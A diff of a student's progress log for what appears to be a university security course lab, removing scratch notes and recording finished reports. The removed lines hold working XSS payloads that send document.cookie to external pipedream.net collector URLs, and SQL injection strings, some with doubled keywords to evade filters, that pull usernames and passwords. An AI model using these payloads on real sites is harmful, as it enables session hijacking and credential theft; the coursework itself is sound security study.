@@ -189,64 +189,9 @@ Progress made so far
 
 
 
-8/04/2021 4:00pm - 
+8/04/2021 4:00pm - 9/04/2021 12:51pm (about 2-3 hrs total on and off)
 
 - continue working on security report
-- 
-
-
-
-
-
-`http://xss2.comp6841.xyz/search?q=<script>document.location="https://enk9enz11xjtd.x.pipedream.net/?q="+document.cookie</script>test`
-
-`<script>document.location="https://enk9enz11xjtd.x.pipedream.net/?q="+document.cookie</script>test`
-
-
-
-`<img src="hello" onerror="document.location='https://enk9enz11xjtd.x.pipedream.net/?q='+document.cookie">`
-
-```html
-http://xss4.comp6841.xyz/search?q=<body+onload%3D"document.location%3D%27https%3A%2F%2Fen0qx44nddqfsa.x.pipedream.net%3Fq%3D%27%2Bdocument.cookie">+what+<%2Fbody>
-```
-
-<body onload="document.location='https://en0qx44nddqfsa.x.pipedream.net?q='+document.cookie"> what </body>
-
-
-
-![image-20210315123330789](Progress made so far.assets/image-20210315123330789.png)
-
-
-
-
-
-http://xss4.comp6841.xyz/search?q={<script>https://en0qx44nddqfsa.x.pipedream.net?q="+document.cookie</script>}
-
-
-
-
-
- ' OR '1'='1'; -- assd
-
-
-
- ' OR '1'='1' union select * from secret; -- assd
-
-
-
-
-
-
-
-' UNIUNIONON SELSELECTECT username, password, 'filler' FRFROMOM information_schema.tables; -- asdfsdfsdf
-
-
-
-
-
- ' OR '1'='2' UNIOUNIONN SELESELECTCT * FROFROMM  information_schema.tables;  -- assd
-
-
-
-  ' UNIUNIONON SELSELECTECT username, password, 'filler' FRFROMOM users; -- asdfsdfsdf
-
+- finished security report
+- finished writing portfolio report
+  - This took ages since I had so many pieces of evidence to find and move to a convenient location so the marker doesn't spend forever like I did.
